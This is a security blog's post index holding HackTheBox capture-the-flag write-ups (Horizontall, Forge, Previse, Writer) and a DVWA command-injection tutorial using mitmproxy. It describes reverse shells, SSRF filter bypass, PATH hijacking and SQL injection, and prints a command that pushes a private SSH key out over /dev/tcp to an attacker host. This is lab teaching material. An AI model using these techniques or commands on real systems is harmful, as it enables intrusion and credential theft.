[
  
  {
    "title": "Horizontall - HackTheBox",
    "url": "/posts/hackthebox/horizontall.html",
    "categories": "hackthebox",
    "tags": "linux, web, static analysis, cve, rce, tunneling",
    "date": "2022-02-05 00:00:00 +0100",
    
    "snippet": "Horizontall is an easy linux box featuring two RCEs. It has a web service that is generated using some imported JavaScript. Analysing the JavaScript code will lead you to a hidden subdomain, which host a vulnerable web application that you can exploit to gain code execution on the server. Once inside, you will find a Laravel instance running locally, which is also vulnerable to RCE, and will give you access to the box as root.About  OS - Linux  Difficulty - Easy  Points - 20  Release - 28/Aug/2021  IP - 10.10.11.105ReconNmapNmap scan report for 10.10.11.105Host is up (0.26s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open  http    nginx 1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 99.42 secondsHomepage of the web service;Technologies detected by Wappalyzer;The web page contains a few buttons/links, including a contact-us form, none of which do anything.Viewing the source code of the file indicate it’s being dynamically generated using JavaScript, with 2 JavaScript files being imported;The first JS file is pretty large at about 1.2 MB in size. The second one is only 20 KB in size. The JS codes have a mangled syntax, and had to be formatted using js-beautify for easier analysis. About 2 minutes into skimming through the code, I discovered a subdomain on the site;I updated my /etc/hosts file with the new host, and was able to connect;FootholdSearching for one of the web technologies identified by Wappalyzer on the host api-prod.horizontall.htb using searchsploit revealed some interesting flaws;Using the last exploit shown above, I was able achieve blind command-injection on the host;I then used it to spawn a bash reverse shell;A user named developer exists, and I was able to obtain the user flag using the strapi account;The user flag file is the only thing readable to the strapi account inside developer’s home directory, so I continue to explore the system to find something of use. Inside the strapi installation folder in /opt/strapi, I found a JSON file with credentials for the developer user developer:#J!:F9Zt2u;The config seems to be for MySQL server, and netstat showed a MySQL server is running locally, along with some strange service on port 1337;Attempt to login to the developer account via SSH using the credential found failed. I was able to access the backend MySQL server using the above credential, but found nothing of interest.Using curl, the service on port 1337 was identified to be the web app discovered on http://api-prod.horizontall.htb/, while the service on port 8000 was identified as a Laravel installation by downloading the home page using curl on the target host and shipping it to my attack host using netcat.I then created an SSH key file for the strapi user manually because the bash session through netcat is unstable, and shipped the private key to my attack box using the commands;# On attacking machine (a netcat listener to save the file)$ sudo nc -lvp 443 &amp;gt; id_rsa# On target machine in the home of strapi$ ssh-keygen # Create the keys$ cd .ssh/$ cp id_rsa.pub authorized_keys # Enable the key.$ cat id_rsa &amp;gt; /dev/tcp/10.10.14.31/443 # Push it to my box# On attacking machine$ chmod 600 id_rsa # Required by the ssh client$ ssh -i id_rsa strapi@horizontall.htb # Connect using the keyIt worked and I gained SSH access to the box as strapi. Using the SSH access, I set up local port-forwarding from my host on port 8000 to the Laravel service on port 8000 on the target host;PrivEscA quick search found a promising RCE exploit for the version of Laravel running (version 8), but couldn’t use it as it required absolute path of Laravel running on the host, which I didn’t know;I was able to obtain the web root by querying /profiles, a file I read about while reading a post on hacktricks on Laravel debug mode exploitation, on the web app;I was able to get the exploit working on first try using the discovered web root for Laravel;Using my SSH access to strapi user, I downloaded a bash reverse shell from a web service running on my attack host, saved it as /dev/shm/bash_rev.sh, made it executable, and execute it using the Laravel exploit. I took this approach because directly executing the bash reverse shell code using the Laravel exploit kept failing. This gave me root access to the box;Summary  Identified running services using NMAP.  Found a web app that relies heavily on JavaScript to dynamically generate contents, all of which are imported from .js files.  Downloaded the .js files for code analysis, which revealed a hidden virtual host running a web service at api-prod.horizontall.htb          Wappalyzer identified a CMS named strapi, and a search using searchploit revealed an RCE flaw, using which a remote shell was obtained on the host as the user strapi.        Inside the box as the user strapi;          User account with the name developer was identified, and the user flag was obtained from his/her root directory.      Identified a service running locally on port 8000 as Laravel version 8, which is vulnerable to RCE.      Setup a tunnel with SSH, which allowed me to exploit the RCE flaw.      "
  },
  
  {
    "title": "Exploiting Web Applications with MITM Proxy and Elinks",
    "url": "/posts/tutorial/mitmproxy.html",
    "categories": "tutorial",
    "tags": "mitmproxy, mitmweb, elinks, dvwa, web, proxy, command injection",
    "date": "2022-01-25 00:00:00 +0100",
    
    "snippet": "In this little tutorial, I demonstrate how to use mitmproxy and elinks to exploit a vulnerable web app completely from the command line. The target used is DVWA (Damn Vulnerable Web Application), which is running locally in a docker container.The ToolsElinks is a console-based web browser that can be used to browse through websites from the command line. From the manual;  ELinks is a text mode WWW browser, supporting colors, table rendering, background downloading, menu driven configuration interface, tabbed browsing and slim code. Frames are supported. You can have different file formats associated with external viewers. mailto: and telnet: are supported via external clients. ELinks can handle both local files and remote URLs. The main supported remote URL protocols are HTTP, HTTPS (with SSL support compiled in) and FTP. Additional protocol support exists for BitTorrent finger, Gopher, SMB and NNTP. The homepage of ELinks can be found at http://elinks.cz/, where the ELinks manual is also hosted.MITM Proxy is a proxy that you can use from the terminal to inspect, modify, and replay HTTP traffic. Think of it as a console-based Burp Suite alternative. From the official site;  mitmproxy is your swiss-army knife for debugging, testing, privacy measurements, and penetration testing. It can be used to intercept, inspect, modify and replay web traffic such as HTTP/1, HTTP/2, WebSockets, or any other SSL/TLS-protected protocols. You can prettify and decode a variety of message types ranging from HTML to Protobuf, intercept specific messages on-the-fly, modify them before they reach their destination, and replay them to a client or server later on.In this post, I will be using the two tools mentioned to solve a challenge in DVWA.SetupNow that we know the tools we need, let’s get started. You can install ELinks and MITM proxy in debian-based distros (which is what I’m using) with;$ sudo apt install elinks mimtproxyI already have DVWA installed locally in my docker container, and there is a good tutorial here on how to set it up.With DVWA installed, it’s time to test the tools. You can open a URL in elinks using the command;$ elinks &amp;lt;url&amp;gt;In my case, DVWA is installed at http://localhost/dvwa/. Running elinks http://localhost/dvwa load up the login page of DVWA;Using the default credentials of admin:password, I logged in successfully. Elinks is working!Now time to check out MITM proxy. But before we do that, we need to configure Elinks to proxy all HTTP(s) traffic through MITM proxy. A way to do that is by setting the global variables HTTP_PROXY and HTTPS_PROXY with the URL of our MITM proxy. Keeping in mind that MITM proxy by default runs on port 8080, this can be configured using the command;$ export HTTP_PROXY=http://localhost:8080$ export HTTPS_PROXY=http://localhost:8080With that step completed, we can now launch the proxy;$ mitmproxyRestarting Elinks and login into DVWA, you can see that all the requests (referred to as flows in MITM proxy) were routed through the proxy;Scrolling down the POST request used for login (using arrow keys), we could view the contents of the flow by hitting enter, or simply clicking on the flow;(The request)(The response. You can view this by clicking the “Response” tab, or by simply pressing the -&amp;gt; arrow key )To go back to the main menu, press q, which is used to “exit the current view” (you can view all key bindings by pressing ?).The AttackFor this post, I will be exploiting a very easy command injection vulnerability in DVWA. User is provided with an input field to enter an IP address for the web application to ping;If you’ve used the ping utility before, the output above will look very familiar, as it is the one generated by the ping command. We can quickly test this from the console;This indicate the the IP we entered is likely being included in a shell command. This can be tested by going to back to our proxy, and playing around with the request.We can modify the contents of a request in the proxy by pressing e (edit), which will open a small menu asking us what we would like to edit. Since we are targeting a POST parameter, which is in the body of the request, our choice is 2;This will open another window containing the name and values of all the form parameters. Move to the field containing localhost (the value we would like to change) and press enter to start the edit;After you are done, press esc key (to leave edit mode in the field) and then q to go back to the flow menu. As you can see in the below image, the request has been modified successfully;Now we need to send the modified request to the server. To do so, just hit r (replay). A small green circle marker should appear near the URL at the top of the proxy window, which indicate the flow has been replayed. Going to the response tab, we can see that the injected command was executed;Staying FocusedUsing FiltersMITM proxy by default will log every request sent through it and will show it to you in the main menu. This often gets distracting as the requests pile up. A way to solve this is to set up a filter using regular expression so that only flows you are interested in are displayed. Example: In the below image, MITM proxy is showing flows we have 0 interest in;Since we know all URLs for DVWA start with http://localhost/dvwa, we can set up a filter by pressing f, which opens the command prompt of MITM proxy and prefix it with set view filter= (we can manually open the command prompt by typing :), and typing ~u http://localhost/dvwa;Press enter, and watch the filter come to live;It is possible to set the filter to match more than one URL using the logical OR | operator. For example: ~u http://localhost/dvwa|https://google.com will display flows to DVWA, and Google.Note that the ~u in front of the URL is what indicate what the pattern should be matched against. You can view other filter rules by pressing ? and clicking on the Filter Expressions tab (or pressing the -&amp;gt; key). You can match request body, response body, HTTP response code, request headers, and much more!Marking flowsAnother useful feature of mitmproxy that help you focus is the ability to “mark” a flow in the main menu. Just press m while hovering over a flow, and that flow will be marked (or unmaked, depending on it’s state). Notice the red dot in the image below, which indicate a marked flow;After marking flows you are interested in, hit M to make the proxy display only flows that were marked. Press M again to disable this feature.The InterceptsVery often you would want to modify a request after it left a browser, but before it reaches a server. This is called an intercept, and MITM proxy can be used to do this.To intercept a request, you will need to define a scope, which is done using similar expressions used in filtering flows showed in the proxy menu. In the main menu, press i, which will open the command prompt and prefix it with set intercept=. In our example, we can intercept all requests made to DVWA by typing ~u http://localhost/dvwa and pressing enter.With the intercept in place, once we visit a page that matches the given URL, the browser will hang and MITM proxy will present us with the intercepted request, which will be colored red;Clicking on flow, we can do all the modifications we want on it. Let’s change the URL and make it point to a different path. We can do so by pressing e and selecting url in the option;As you can see, after hitting enter, the flow has been successfully modified;To forward this modified request to the server, press a. This will forward the request to the server and obtain a response. Note that the response is also intercepted, which gives you a chance to inspect or modify it. After you are done, hit a again to forward the response back to the browser. You can also kill an intercepted flow by pressing X in the main menu.Sometimes, you are only interested in modifying one intercepted flow, and the number of intercepted flows may start to pile up.  In this case, you can forward all intercepted flows after you are done with your modifications by pressing A in the main menu. You can also quickly enable/disable your configured intercept by pressing I, which will cause an X to appear in the beginning of your intercept rule;PersistenceYou may often need to save the work you have done in MITM proxy so that you can resume from where you stop, or just for record keeping. MITM proxy allows you to save all the listed flows from the main menu by pressing w, and typing the name of the file you want to save the flows as;The above will save the flows as dvwa.flows. Alternatively, you can save an individual flow by opening the flow (by clicking on it) and pressing w, which will prompt you for a filename.To load the saved flows next time you launch the proxy, press L in the main menu, and enter the name of the file containing the flows;BonusResponsible ModificationsWhen modifying a flow in MITM proxy, you should always start by making a copy of it. That way, you have an unmodified copy you can go back to if you messed up the copy you are working on, or just for reference purposes. You can duplicate a flow in the main menu by pressing D while hovering over the flow;To delete a flow you no longer need, just press d while hovering on it. You can also wipe out all flows by pressing z.MITM WebMITM proxy comes with another program, mitmweb, which you can use to start a proxy that you can control through a web browser. To use this, do;$ mitmwebThe above will start a proxy server on port 8080, and the web interface of the proxy on port 8081.  Going to http://localhost:80801, you will be presented with the web UI of MITM proxy;ConclusionMITM proxy is a very nice tool that you can use to easily study and modify web traffic. It has a bit of a learning curve like most tools, but once you get the hang of it, it is quite amazing. The key bindings make most of the tasks a lot less painful. I find myself using it quite often when all I need is a few basic web proxy functionalities."
  },
  
  {
    "title": "Forge - HackTheBox",
    "url": "/posts/hackthebox/forge.html",
    "categories": "hackthebox",
    "tags": "linux, web, ssrf, broken access control, ftp, python, pdb, custom exploitation",
    "date": "2022-01-23 00:00:00 +0100",
    
    "snippet": "Forge is a very nice medium linux box featuring a web service that allows for local and remote file upload (via URL). After the upload, user is given a random URL to access the uploaded file. This URL upload functionality has a filter that attempts to block SSRFs, but the filter is flawed, and could be exploited to reach another subdomain on the server that foreign hosts are not allowed to directly access. The vector for privilege escalation is a python script that drops into a pdb shell when user caused an exception.InfoReconNMAP# Nmap 7.70 scan initiated Thu Oct 21 20:28:51 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.111Nmap scan report for forge.htb (10.10.11.111)Host is up (0.23s latency).Not shown: 997 closed portsPORT   STATE    SERVICE VERSION21/tcp filtered ftp22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open     http    Apache httpd 2.4.41| http-methods: |_  Supported Methods: OPTIONS HEAD GET|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: GalleryService Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Oct 21 20:29:42 2021 -- 1 IP address (1 host up) scanned in 51.39 secondsWebThere is an image upload functionality at /upload that the homepage links to;Uploading a sample image file saves it to the below location on the server;Clicking the Upload from url in the page above gave me an input field for a URL. Attempts to load a local file using the file:// protocol failed, saying only HTTP and HTTPs protocols are allowed. Entering a URL to my attack host, I got a callback;The python-requests user agent in the header of the request makes me suspect this is some kind of Python WSGI web application. Such applications, from my experience, are an absolute pain to gain command execution through arbitrary file uploads due to the special way they handle paths, so I’m going to ignore this.Bruteforcing the web root with ffuf didn’t yield anything of interest, but bruteforcing for hidden subdomains found one (I had to filter out HTTP redirects as all invalid subdomains result in them);Going to the link, I was told access is only allowed to localhost;Judging from the name of the box, this makes me suspect I need to do some request forgery to fool the web app into thinking I am connecting from localhost. Bruteforcing it’s web root found a directory named static, which is similar to the /static page found on forge.htb, except the latter contains an images directory.My first approach to get around this was to use the image upload functionality on forge.htb/upload. I tried to get web app to send a request to the admin domain, which was blocked;My next step was using special HTTP headers to fool the web app into thinking the request to http://admin.forge.htb came from a different host. It didn’t work. So I performed a full port scan on the host in hope that I missed something that may be used to access this page, like a proxy service. No new port was discovered.FootholdReplacing the subdomain in the URL upload functionality with a random string while keeping the forge.htb hostname resulted in the same URL contains blacklisted address response, which indicate the web app is probably not using it to filter submitted URLs, but rather the hostname. Since hostnames are case-insensitive, I tried to bypass the filter by changing the case of the hostname, and it worked;The web app does not appear to be validating if the contents fetched from the given URL is infact a valid image data, which allowed me to read the HTML code of the admin.forge.htb domain by curling the returned URL;Using the same trick to use the file:// protocol to read local files didn’t work. The above HTML code revealed the path /announcements. Using the URL upload trick above, the file was dumped, and was found to contain some very interesting info, including the credential user:heightofsecurity123!;Attempting to connect to the SSH service using the credential showed the SSH server is likely configured to only allow public key authentication.The contents of the admin.forge.htb/announcement page said it has a file upload function that can be invoked using HTTP request to /upload with the URL passed in the GET parameter u, so tried to use the file:// protocol via this u parameter. The upload returned a success message, but curling the file showed the protocol was blocked, and listed the protocols that are allowed;Testing the FTP protocol by giving it an FTP URL to my attack host (ftp://testuser:testpass@&amp;lt;my-IP&amp;gt;/) with test credentials, tcpdump captured an authentication attempt for the target host;Since NMAP has initially reported an FTP service on the host on port 21 as filtered, I used the credentials of user that was previously obtained to connect to the FTP service running locally on the target. It didn’t work, saying the URL contains a blacklisted address. Using the change of case trick used previously bypassed the filter;Requesting the generated link with curl, I got the contents of the root directory of the FTP service;The presence of the user.txt file indicate the FTP root directory is the home directory of a user. And since the SSH service on the host is blocking password authentication, I’m guessing the user will have public key authentication configured. So I crafted a request for .ssh/id_rsa, which will be the private key file of the user, and it worked;I saved the SSH private key as id_rsa, chmod 600 it, and gained access to the box as user over SSH;PrivEscInside the box as user, I have sudo permission to run a python program;The code of the script;#!/usr/bin/env python3import socketimport randomimport subprocessimport pdbport = random.randint(1025, 65535)try:    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    sock.bind((&#39;127.0.0.1&#39;, port))    sock.listen(1)    print(f&#39;Listening on localhost:{port}&#39;)    (clientsock, addr) = sock.accept()    clientsock.send(b&#39;Enter the secret passsword: &#39;)    if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;:        clientsock.send(b&#39;Wrong password!\\n&#39;)    else:        clientsock.send(b&#39;Welcome admin!\\n&#39;)        while True:            clientsock.send(b&#39;\\nWhat do you wanna do: \\n&#39;)            clientsock.send(b&#39;[1] View processes\\n&#39;)            clientsock.send(b&#39;[2] View free memory\\n&#39;)            clientsock.send(b&#39;[3] View listening sockets\\n&#39;)            clientsock.send(b&#39;[4] Quit\\n&#39;)            option = int(clientsock.recv(1024).strip())            if option == 1:                clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode())            elif option == 2:                clientsock.send(subprocess.getoutput(&#39;df&#39;).encode())            elif option == 3:                clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode())            elif option == 4:                clientsock.send(b&#39;Bye\\n&#39;)                breakexcept Exception as e:    print(e)    pdb.post_mortem(e.__traceback__)finally:    quit()Program LogicThe program, when executed, binds to a random port. When a connection is received, it asks for a password, which must be secretadminpassword. If the password is incorrect, the connection is killed. If the password is correct, user is given a bunch of options of the task they wish to perform. This choice is casted to an integer using int(), and the selected action, if valid, is performed. Should an exception occur during all this, the exception will be printed (print(e)), and a pdb (Python Debugger) shell will be spawned in the command prompt that invoked the script.ExploitA pdb shell is a powerful shell that can be used to access all the functionalities of the python interpreter. Since user input is directly casted to an integer, and any error will result in the pdb shell being launched, I was able to exploit this by simply connecting to the listener created by the script from another terminal using the locally installed netcat program, provide the valid password, and give a non-numeric input when asked for the task to perform;Summary  Identified running services using nmap  Found an image upload functionality on the web page that does not validate data, and accepts URL uploads.  Discovered a hidden subdomain admin.forge.htb by fuzzing with ffuf. Access to the domain is only allowed to local hosts.          Exploited the URL upload functionality in the main forge.htb site to access the admin.forge.htb domain.      Dumping the HTML source of the homepage of the admin domain revealed a link to /announcements, which was found to contain an FTP credential for a user named user.      Exploited the URL upload in admin.forge.htb/upload to read the SSH private key of the user over FTP.        Inside the box as user;          user has access to run /opt/remote-manage.py as root using sudo      Exploited the python script to drop into a pdb shell for privesc.      "
  },
  
  {
    "title": "Previse - HackTheBox",
    "url": "/posts/hackthebox/previse.html",
    "categories": "hackthebox",
    "tags": "linux, web, execute after redirect, broken access control, static analysis, command injection, hash cracking, path tampering",
    "date": "2022-01-16 00:00:00 +0100",
    
    "snippet": "Previse is an easy linux box that I really enjoyed. It has an Execute After Redirect (EAR) vulnerability, whereby the application issues a redirect when an unauthenticated user is attempting to access protected pages. However, the contents of the page is still returned in the body of the 302 redirect, but would be hard to notice in a browser as the browser will immediately follow the redirect. Foothold involves exploiting a command injection flaw in the web application, and privilege escalation is via path tampering.Info  OS - Linux  Difficulty - Easy  Points - 20  Release - 07/Aug/2021  IP - 10.10.11.104ReconNmapStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-28 10:39 WATStats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                                       SYN Stealth Scan Timing: About 99.99% done; ETC: 10:40 (0:00:00 remaining)                                                            Nmap scan report for 10.10.11.104Host is up (0.26s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                     80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                        Nmap done: 1 IP address (1 host up) scanned in 86.13 secondsThe web server provide a login page (PHP);Identified web technologies;Attempts to find the source code of the web app through google searches were unsuccessful.searchsploit showed user enumeration vulns for the version of OpenSSH running;Only the bottom one was runnable during testing, and provides false positives.Further digging discovered a link to a menu that provides some links, most of which are login-protected;I was stucked on this for quite a long time with no idea what to do next as fuzzing for hidden contents and virtual hosts with gobuster and ffuf yielded nothing. Going through captured HTTP traffic in mitmproxy revealed something very weird;When a request was made to /accounts.php (a link I discovered earlier), the web server redirects user to the login page. Most HTTP redirects simply return an emtpy HTML body. However, this one returns the contents of the requested web page, which the browser does not display as it simply follows the redirect instruction. As can be seen in the image above, there is a form for account creation, that was expected to be accessible only to admins. Using the parameters defined in the web form, I was able to craft a POST request to create an account, and gain access to the web application;FootholdHaving gained access to the web application, the next step is to gain a command shell on the host.I found an interesting file in the /files.php page containing possible backup data, and the username of another user newguy;The link to the file is http://previse.htb/download.php?file=32, with the numeric ID being an interesting target for file enumeration. True to it’s name, the file downloaded is a ZIP file containing source code of the web app;The file config.php was found to contain MySQL credentials, which is probably running locally as I can’t access the service from my host;&amp;lt;?phpfunction connectDB(){    $host = &#39;localhost&#39;;    $user = &#39;root&#39;;    $passwd = &#39;mySQL_p@ssw0rd!:)&#39;;    $db = &#39;previse&#39;;    $mycon = new mysqli($host, $user, $passwd, $db);    return $mycon;}?&amp;gt;The username was tested against possible users on the SSH server, but didn’t match any.Using the file upload functionality, I generated a PHP web shell using weevely and upload it to the web app to gain code execution;This did not work as requests to the uploaded file simply result in file download to client with no execution at server side;At this point I decided to analyse the PHP codes involved in file upload and download to figure out a way, if any, to exploit this. Review of /download.php showed the files are stored in the MySQL backend, not disk.I can’t think of any way to exploit this since the file is not stored on disk in the web root. So I continue to analyse other PHP source codes downloaded from the server, and caught a break in the file /logs.php, which is used to download file access logs from the server;Notice in the above code that the POST parameter delim, which is used to specify type of delimiter to use when generating the log output, is injected directly into a shell command, making it vulnerable to Command Injection attacks;I spawned a reverse shell on the host using netcat and bash, and identified a local user named m4lwhere.netstat showed a service running on port 3306 (MySQL)Using the root credentials found earlier in the site’s backup file, I gained access to the previse database, and found the password hash of m4lwhere;The hash captured could not be cracked with the infamous rockyou.txt wordlist using john, so I moved on.Surfing through the file system I made an interesting discovery;This may be helpful when going for root, but I am still working as www-data.Going through the results of john from the previous attempt, I noticed a warning where john identified the hash as more than one type;Since john used md5crypt in the first attempt, I manually selected the other format, and the hash was cracked successfully after taking much longer. Recovered credential: m4lwhere:ilovecody112235!I was then able to connect to the box over SSH, and obtain the user flag;PrivEscThe user m4lwhere can run a custom script as root using sudo;The code of the script;Notice that the script executes the gzip program to create some archives. However, the call to gzip uses relative, not absolute path. When a program is referenced using relative path, the program is searched in the directories defined in the user’s $PATH environment variable, and the first match found is executed. Since I can alter the $PATH variable of the user, the script can be fooled into executing a file with the name gzip that comes before the actual gzip program in the $PATH hierarchy;  The original $PATH  Created a bash reverse shell saved as gzip in /dev/shm  Prefix $PATH with /dev/shm to hijack relative calls to gzipExecuting the script using sudo sent a reverse shell with root privileges to my attack host;Summary  Identified running services using NMAP.  Found a login page at /login.php, and a navigation menu at /nav.php  Noticed that the web app redirects unauthenticated users to the login page when they make a request to an authentication-protected page for accounts creation at /accounts.php, but includes the actual contents of the page in the body of the response. This can hardly be noticed when using a web browser.  Crafted a request using the parameters identified in the /accounts.php page to create an account, which gave me admin access to the web app.  Found a ZIP file containing backup of the source code of the web application, analysis on which revealed a login credential of a locally-running MySQL server for the root user.  Tested the file upload functionality for web shells upload and execution, which failed because all uploaded files are stored in the backend MySQL server, not disk.  Identified a Command Injection flaw through static analysis of the downloaded source code backup. The file is /logs.php, which generates log messages for download. This was exploited to gain access to the host as www-data (the default apache2 web user).  Inside the host as www-data;          netstat identified a local MySQL server running, accessible using the MySQL credentials found in the configuration file in the site backup archive.      Found a password hash for a user named m4lwhere inside the previse database, cracked it using John the Ripper and the iconic rockyou.txt wordlist, and gained SSH access to the box.        Inside the host as m4lwhere;          Idenitifed a script that can be executed by the user with root privileges using sudo.      The script was found to be making a call to another binary using a relative path, which make it vulnerable to arbitrary code execution via $PATH tampering. This flaw was exploited to gain a root shell.      "
  },
  
  {
    "title": "Writer - HackTheBox",
    "url": "/posts/hackthebox/writer.html",
    "categories": "hackthebox",
    "tags": "linux, web, sql injection, sqlmap, authentication bypass, command injection, enumeration, static analysis, arbitrary file upload, hash cracking, apt, lateral movement, python, django",
    "date": "2021-12-11 00:00:00 +0100",
    
    "snippet": "Writer is definitely one of the toughest boxes I have ever solved at the time of writing this. It features a website that is vulnerable to SQL injection, which leads to authentication bypass. Once you have access, there is a feature that allows you to add and edit stories, which is vulnerable to command injection in the filename, but will be tricky to spot without using the SQL injection flaw and reading the python code of the web application.Once inside the box, there are two local users, kyle, and john. Access to Kyle’s account was obtained after cracking a hash obtained from a local MySQL database. Once you have access as Kyle, you can exploit a write permission to /etc/postfix/disclaimer to move laterally to John’s account, and from there exploit another write permission to create a malicious configuration file that will be by apt through a cron job to gain code execution as root.InfoReconNMAP# Nmap 7.70 scan initiated Thu Oct 14 07:14:55 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.101Nmap scan report for 10.10.11.101Host is up (0.22s latency).Not shown: 995 closed portsPORT     STATE    SERVICE     VERSION22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80/tcp   open     http        Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_  Supported Methods: OPTIONS HEAD GET|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Story Bank | Writer.HTB139/tcp  open     netbios-ssn Samba smbd 4.6.2445/tcp  open     netbios-ssn Samba smbd 4.6.23809/tcp filtered apocdService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 14m21s, deviation: 0s, median: 14m21s| nbstat: NetBIOS name: WRITER, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| Names:|   WRITER&amp;lt;00&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;|   WRITER&amp;lt;03&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;|   WRITER&amp;lt;20&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;|   \\x01\\x02__MSBROWSE__\\x02&amp;lt;01&amp;gt;  Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;|   WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;|   WORKGROUP&amp;lt;1d&amp;gt;        Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;|_  WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-10-14 07:30:13|_  start_date: N/ARead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Oct 14 07:15:57 2021 -- 1 IP address (1 host up) scanned in 61.77 secondsA complete port scan didn’t yield any additional port.WebFound an email address admin@writer.htb in the about page;The contact us page has a form that appears to be non-responsive at first, but looking at my proxy, a request was actually made that returned a 404 Not found;Removing the PHP extension from the form submission path above resulted in a 200 response, but the response obtained is no different from the original page.Bruteforcing the web root using ffuf showed some interesting paths;The path /dashboard redirects to the homepage, which I am guessing is due to access control. The /administrative page provide a login page;Testing common usernames and passwords did not work. Bruteforcing the blog posts numeric ID did not reveal any hidden post.The /static page has directory listing, but nothing of interest was found inside;SMBAttaempting null authentication and intentionally wrong credentials kept giving me this error;Quick googling showed this could happen due to permission errors or non-existing shares. Since I don’t know any share name I assumed it was the latter.Using smbmap (Impacket), I was able to list some shares with null authentication, but I have access to none of them;Dumping the password policy of the SMB server using CrackMapExec, the server does not have any auto-locking policy for accounts, which means we can bruteforce creds with locking accounts;Bruteforce attampts with CrackMapExec kept giving false postives;I’m guessing the error is due to lack of SMBv1 support, which is what  hydra reported also;Even metasploit’s SMB login bruteforce module errored out;The Web Login FormThe login form at /administrative page is submitted via POST request with the parameters uname and password. Changing the request method to GET does not appear to affect the way the web app process the form. Deleting the password parameter raised a 500 INTERNAL SERVER ERROR, but deleting the uname parameter didn’t display any error. This indicate a difference in the way the two parameters are handled by the web application. Attempts to bruteforce the login page using the discovered email address admin@writer.htb, the username admin, and a wordlist made by crawling the web pages using CeWL didn’t work.Fuzzing the login parameter username with SQL Injection payloads worked, leading to a successful authentication bypass, which redirected me to the /dashboard page;DashboardIn the settings page, there is an option that allows the title, description, and logo of the site to be changed. This could be an interesting target for stored XSS when targeting other users, but I don’t think I need it since I can access all accounts using the SQL injection flaw in the login page.However, clicking the save button in the bottom of the page did not send any request. Going to the users page, it appears the only user account in the web app is that of the admin;Going into the stories page from the navigation menu, a list of all the stories were displayed, along with an option that allow stories to be updated;During this update, user can change the title, tagline, image, and content of the story;The image upload functionality validates uploaded files by checking the extension of the file submitted in the POST request, and rejects it if it doesn’t end with a .jpg extension. Saving a PHP file as test.jpg allows the file to be uploaded, but couldn’t be executed due to the extension not being .php;By changing the file extension to .jpg.php, the upload succeeded, which indicate the web app merely checks for the presence of .jpg in the filename;When the above script was requested, however, the server simply sends the file for download without executing it;I assumed it’s some .htaccess-like config preventing the server from executing the PHP file, so I tried testing the filename POST parameter for path traversal, which the web app is vulnerable to;Multple attempts to have the code executed did not work. Since the login page is vulnerable to SQL injection, I dumped the login request to a text file and passed it to sqlmap to work it’s magic.SQLMapAfter exporting the login request from Burp Suite, I passed it to sqlmap with the --threads=10 to speed things up a bit since it’s a blind SQL injection. It identified 2 databases in the server; information_schema, which is default for MySQL servers, and writer;Tables found in the writer database;After sqlmap screemed at me all the way about invalid characters, the table users was dumped successfully, which was found to contain hash of the user admin;The above hash looks corrupted since the inital length of the field as reported by sqlmap was 32 characters long, but after dumping, the hash in the CSV file was 37 characters long. This made sense since sqlmap warned me about reliability issues when using multiple threads for blind injections. So I used the --sql-shell argument to run specific SQL command that retrieve only the target hash;Although the hash looks like an MD5 hash, john identified it as multiple other formats, all of which were tested. But the hash could not be cracked.FootholdWith the admin  hash proving to be uncrackable, I went back to the file upload vulnerability on the admin dashboard. The path traversal vulnerability allows writing to top level directories that are writable to the web server user like /tmp and /dev/shm. Attempts to write to the default apache web root /var/www/html failed. Multiple command injection payloads in the filename parameter for the uploaded image also failed, and I just can’t get the server to execute uploaded PHP codes. So I moved on.Going back to the SQL injection using sqlmap, I realized I may be able to read local files using the --file-read argument. So I tested it by requesting /etc/hostname, and it worked. Since it’s a blind injection, the retrieval was slow and will be slower when dealing with larger files;SInce there is a path traversal vulnerability when editing stories in the admin dashboard that I couldn’t exploit to gain code execution as I couldn’t figure out the web root of the server, and I know the target is a linux host, I tried dumping  the file 